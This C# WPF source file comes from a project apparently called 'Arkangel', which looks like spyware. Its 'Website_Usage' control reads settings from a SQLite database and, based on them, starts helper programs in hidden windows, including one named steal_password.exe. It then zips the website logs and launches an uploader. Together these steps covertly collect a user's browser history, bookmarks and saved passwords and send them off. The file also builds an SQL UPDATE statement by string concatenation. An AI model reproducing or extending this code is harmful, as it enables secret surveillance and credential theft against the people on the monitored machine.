using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Arkangel
{
    /// <summary>
    /// Interaction logic for Website_Usage.xaml
    /// </summary>
    public partial class Website_Usage : UserControl
    {
        public Website_Usage()
        {
            InitializeComponent();
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlConn_WU = new SQLiteCommand(@"SELECT * FROM webusage,current_user WHERE webusage.id = current_user.id", connect);
                    SQLiteDataReader mWU = sqlConn_WU.ExecuteReader();
                    while (mWU.Read())
                    {
                        if (mWU["getHistory"].ToString() == "1") cb_enable.IsChecked = true; else cb_enable.IsChecked = false;
                        if (mWU["getBookmark"].ToString() == "1") cb_bookmark.IsChecked = true; else cb_bookmark.IsChecked = false;
                        if (mWU["getPassword"].ToString() == "1") cb_password.IsChecked = true; else cb_password.IsChecked = false;
                    }
                }
            }
          
            if (cb_enable.IsChecked.Value == true)
            {
                try
                {
                    ProcessStartInfo start = new ProcessStartInfo();
                    start.WorkingDirectory = @"..\..\module\";
                    start.FileName = "website_usage.exe";
                    start.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(start);
                }
                catch { }
            }
            if (cb_bookmark.IsChecked.Value==true)
            {
                try
                {
                    ProcessStartInfo start = new ProcessStartInfo();
                    start.WorkingDirectory = @"..\..\module\";
                    start.FileName = "bookmark.exe";
                    start.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(start);
                }
                catch { }
            }
            if (cb_password.IsChecked.Value==true)
            {
                try
                {
                    ProcessStartInfo start = new ProcessStartInfo();
                    start.WorkingDirectory = @"..\..\module\";
                    start.FileName = "steal_password.exe";
                    start.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(start);
                }
                catch { }
            }

            //Upload..

            try {
                Functions.ZipFolderWebsite();
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upWebsiteLogs.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        private void bt_OK_Click(object sender, RoutedEventArgs e)
        {
            string getHistory="0";
            string getBookmark="0";
            string getPassword="0";
            if (cb_enable.IsChecked.Value == true) getHistory = "1";
            if (cb_bookmark.IsChecked.Value == true) getBookmark = "1";
            if (cb_password.IsChecked.Value == true) getPassword = "1";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlup_WU = new SQLiteCommand(@"UPDATE webusage SET id=1, getHistory="+getHistory+",getBookmark="+getBookmark+",getPassword="+getPassword, connect);
                    sqlup_WU.ExecuteNonQuery();
                }
            }

            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upWebsiteLog.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
                Functions.syncUp();
        }
    }
}
